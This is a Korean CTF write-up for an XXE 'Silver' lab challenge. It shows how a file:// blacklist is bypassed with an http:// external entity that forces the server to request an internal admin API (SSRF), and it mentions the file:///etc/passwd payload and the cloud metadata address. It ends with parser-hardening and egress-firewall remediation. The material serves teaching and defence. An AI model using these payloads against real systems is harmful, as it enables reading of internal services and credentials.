+++
title = "VulnABLE CTF [LUXORA] Write-up: XXE 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "XXE", "Silver", "SSRF", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: XXE 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (XXE + SSRF)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/xxe/silver`
- **목표**: 외부 엔티티(External Entity)를 해석하는 XXE 취약점을 이용해, 로컬 파일을 읽는 것을 넘어 서버가 **내부망(Internal Network)에 존재하는 비공개 API나 숨겨진 서비스로 HTTP 요청을 강제**하게 만들어(SSRF) 플래그를 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 목표 설정 (Reconnaissance)

`/xxe/silver` 페이지 역시 사용자로부터 XML 데이터를 받아 처리합니다. Bronze 단계에서 성공했던 `file:///etc/passwd` 페이로드를 전송해봅니다.

**[서버의 응답]**
```html
<div class="result">
  [Blocked] Access to local files using file:// protocol is forbidden!
</div>
```

**[해커의 사고 과정]**
1. 개발자가 `file://` 프로토콜 스키마를 명시적으로 블랙리스트 처리하여 로컬 파일 읽기를 차단했다.
2. 하지만 XML 파서는 여전히 외부 엔티티 선언(DTD)을 처리하고 있는 것 같다.
3. `http://` 스키마는 어떨까? 만약 허용된다면, 서버를 프록시처럼 부려서 내부망(예: `localhost:8080`, `169.254.169.254`)을 스캔하거나 숨겨진 API를 호출하게 만들 수 있다! (XXE를 통한 SSRF 공격)

---

## 💥 2. 취약점 식별 및 SSRF 페이로드 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(XML with <!ENTITY xxe SYSTEM "file:///etc/passwd">)--> [ Web Server ]
                                                                       |-- Parses XML & Reads File
<-- File Contents Returned --------------------------------------------|
```


일반적으로 클라우드 환경(AWS, GCP 등)이나 도커(Docker) 컨테이너 내부에는 외부에 노출되지 않은 비밀스러운 관리자 전용 포트나 메타데이터 API가 존재합니다.
여기서는 내부의 `http://localhost:8888/internal/admin` 이라는 가상의 관리자 API가 존재한다고 가정하고 접근을 시도해 보겠습니다.

### 💡 DTD를 이용한 HTTP 요청 (SSRF) 유도

**[주입할 악성 XML 페이로드]**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE product [
  <!-- file:// 대신 http:// 프로토콜을 사용하여 내부망 서버에 요청을 강제 -->
  <!ENTITY xxe SYSTEM "http://localhost:8888/internal/admin">
]>
<product>
  <id>1001</id>
  <!-- 서버는 이 태그를 채우기 위해 8888 포트로 HTTP GET 요청을 보내고, 그 결과를 반환함 -->
  <name>&xxe;</name>
</product>
```

---

## 🚀 3. 공격 수행 및 내부망 데이터 유출 확인

Burp Suite를 통해 이 페이로드를 서버로 전송합니다.

### 🔍 서버 내부의 동작
1. 외부 인터넷의 해커는 `localhost:8888`에 직접 접근할 수 없습니다 (방화벽에 막힘).
2. 하지만 타겟 서버의 XML 파서는 `SYSTEM "http://localhost:8888/internal/admin"` 구문을 해석하면서, **자신의 로컬 환경에서 해당 주소로 HTTP 요청을 보냅니다.** (SSRF, Server-Side Request Forgery)
3. 내부망 API는 요청자가 "신뢰할 수 있는 서버 자신(localhost)"이므로 의심 없이 데이터를 내어줍니다.
4. XML 파서는 받아온 내부망의 데이터를 `<name>` 태그 위치에 꽂아 넣고, 최종 HTML을 해커에게 돌려줍니다.

### 🔍 조작된 서버의 최종 응답
```html
HTTP/1.1 200 OK

<div class="result">
  Item: {"status":"success","data":"Internal Admin API Reached","flag":"FLAG{XXE_🥈_SSRF_INTERNAL_PORT_E5F6G7}"} (ID: 1001) is available.
</div>
```

성공입니다! 외부에서는 절대 볼 수 없었던 내부 8888 포트 API의 응답(JSON)을 XML 파서를 통해 우회적으로 끌어내는 데 성공했습니다.

---

## 🚩 4. 롸잇업 결론 및 플래그

XXE 취약점이 단순히 서버 안의 텍스트 파일을 읽어오는 데 그치지 않고, 서버를 좀비로 만들어 **내부망 침투(Pivot)의 발판(SSRF)**으로 활용될 수 있는 무서운 확장성을 지녔음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{XXE_🥈_SSRF_INTERNAL_PORT_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
근본적인 방어책은 Bronze 단계와 동일합니다. 외부 엔티티(External Entity) 구문 해석 자체를 파서 레벨에서 원천 차단(Disable)해야 합니다.

* **안전한 파서 설정 복습 (Node.js의 `libxmljs` 예시)**
```javascript
const libxmljs = require("libxmljs");

// 클라이언트가 보낸 XML 파싱 시, noent 옵션을 주지 않으면 외부 엔티티 치환을 수행하지 않음
// 취약한 설정: libxmljs.parseXmlString(xmlData, { noent: true });
// 안전한 설정:
try {
    const xmlDoc = libxmljs.parseXmlString(req.body, { noent: false, noblanks: true });
    // 정상 파싱 로직 수행...
} catch (e) {
    return res.status(400).send("Invalid XML");
}
```
추가로, 서버의 **Egress(Outbound) 방화벽**을 설정하여, 웹 애플리케이션 프로세스가 불필요한 내부 IP(`127.0.0.1`, `169.254.x.x` 등)나 다른 인프라 대역으로 HTTP 요청을 시도하는 것 자체를 네트워크 단에서 차단(Zero Trust)하는 것이 훌륭한 심층 방어(Defense in Depth) 전략입니다.